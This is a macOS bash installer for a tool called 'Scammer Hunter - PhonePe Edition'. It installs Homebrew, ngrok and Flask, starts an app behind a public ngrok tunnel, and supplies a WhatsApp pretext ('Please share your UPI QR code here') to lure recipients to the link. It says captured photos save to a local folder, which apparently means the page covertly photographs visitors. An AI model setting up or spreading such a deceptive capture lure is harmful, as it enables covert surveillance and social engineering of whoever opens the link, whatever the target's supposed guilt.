#!/bin/bash

# Scammer Hunter - PhonePe Edition - Mac Installer
# For macOS users only
# Make this file executable with: chmod +x install.command

# Change to the directory where this script is located
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
cd "$DIR"

clear
echo "========================================"
echo "       Scammer Hunter - PhonePe"
echo "           Mac Installer"
echo "========================================"
echo ""
echo "🎣 This will set up everything automatically! 🎣"
echo ""
echo "Requirements: Internet connection"
echo ""

# Check if Homebrew is installed
if ! command -v brew &> /dev/null; then
    echo "📦 Installing Homebrew (package manager)..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

    # Add Homebrew to PATH for this session
    echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
    eval "$(/opt/homebrew/bin/brew shellenv)"
fi

echo "✅ Homebrew ready!"

# Install Python if not present
if ! command -v python3 &> /dev/null; then
    echo "🐍 Installing Python..."
    brew install python
else
    echo "✅ Python already installed!"
fi

# Install ngrok
if ! command -v ngrok &> /dev/null; then
    echo "🌐 Installing ngrok..."
    brew install ngrok/ngrok/ngrok
else
    echo "✅ ngrok already installed!"
fi

# Install Python packages
echo "📦 Installing Python packages..."
pip3 install --break-system-packages flask requests pyngrok

echo ""
echo "========================================="
echo "     NGROK AUTH TOKEN SETUP"
echo "========================================="
echo ""
echo "You need a ngrok auth token for public URLs."
echo ""
echo "Get it here: https://dashboard.ngrok.com/get-started/your-authtoken"
echo "(Sign up for free, then copy your token)"
echo ""
read -p "Paste your ngrok auth token: " NGROK_TOKEN

if [ -z "$NGROK_TOKEN" ]; then
    echo "❌ No token entered. Setup cancelled."
    exit 1
fi

echo "🔑 Setting up ngrok authentication..."
ngrok config add-authtoken "$NGROK_TOKEN"

echo ""
echo "========================================="
echo "         STARTING SCAM CATCHER!"
echo "========================================="
echo ""

# Kill any existing processes using port 8080 or running app.py
echo "🧹 Cleaning up any existing processes..."
if lsof -i :8080 >/dev/null 2>&1; then
    echo "🔪 Killing processes on port 8080..."
    lsof -ti :8080 | xargs kill -9 2>/dev/null || true
fi

# Kill any existing Python processes running app.py
if pgrep -f "python.*app.py" >/dev/null 2>&1; then
    echo "🔪 Killing existing app.py processes..."
    pkill -f "python.*app.py" 2>/dev/null || true
fi

# Wait a moment for cleanup
sleep 2

# Start Flask server in background (it will handle ngrok internally)
echo "🚀 Starting Flask server..."
python3 app.py &
FLASK_PID=$!

# Wait for Flask and ngrok to start
sleep 8

echo ""
echo "========================================="
echo "        🎉 SETUP COMPLETE! 🎉"
echo "========================================="
echo ""
echo "✅ Flask server and ngrok tunnel started!"
echo "📱 The public URL was shown above - copy it from there"
echo ""
echo "📤 Send this to scammers via WhatsApp:"
echo "'Please share your UPI QR code here: [COPY_URL_FROM_ABOVE]'"

echo "📸 Photos will save to: $(pwd)/captured_photos/"
echo ""
echo "🛑 To stop: Press Ctrl+C or close terminals"
echo ""
echo "========================================="
echo "      HAPPY HUNTING! 🎣📱"
echo "========================================="

# Keep terminal open
read -p "Press Enter to exit..."
kill $FLASK_PID 2>/dev/null
